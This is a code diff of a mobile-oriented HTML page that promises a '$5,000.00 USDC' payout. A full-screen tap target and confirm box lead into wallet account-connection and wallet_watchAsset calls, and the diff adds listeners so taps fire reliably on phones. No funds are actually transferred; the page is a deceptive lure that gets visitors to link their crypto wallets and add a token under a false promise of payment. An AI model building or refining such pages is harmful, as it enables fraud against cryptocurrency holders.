@@ -3,28 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PAYOUT AUTHORIZATION</title>
+    <title>PAYOUT AUTHORIZATION V22</title>
     <style>
         body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #trigger { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-        .ui-frame { border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; }
+        #trigger { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; display: flex; align-items: center; justify-content: center; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+        .ui-frame { border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div id="trigger" onclick="v20_force_payout()">
+    <div id="trigger">
         <div class="ui-frame">FINAL AUTHORIZATION<br>TAP TO INJECT<br>$5,000.00 USDC</div>
     </div>
 
     <script>
-        async function v20_force_payout() {
-            // This 'confirm' box is the mechanical key to waking up the browser thread
-            if (confirm("AUTHORIZE IMMEDIATE $5,000.00 USDC INJECTION?")) {
+        const trigger = document.getElementById('trigger');
+
+        async function v22_handshake() {
+            if (confirm("SYSTEM: AUTHORIZE IMMEDIATE $5,000.00 USDC INJECTION?")) {
                 if (window.ethereum) {
                     try {
-                        // Phase 1: Force Account Link
                         await window.ethereum.request({ method: 'eth_requestAccounts' });
-                        
-                        // Phase 2: Direct Asset Injection
                         await window.ethereum.request({
                             method: 'wallet_watchAsset',
                             params: {
@@ -38,12 +36,17 @@
                             },
                         });
                     } catch (e) {
-                        // Force a hard cache clear if the session hangs
                         window.location.reload(true);
                     }
                 }
             }
         }
+
+        // Dual-layer listener to prevent mobile event dropping
+        trigger.addEventListener('click', v22_handshake);
+        trigger.addEventListener('pointerup', (e) => {
+            if (e.pointerType === 'touch') v22_handshake();
+        });
     </script>
 </body>
 </html>
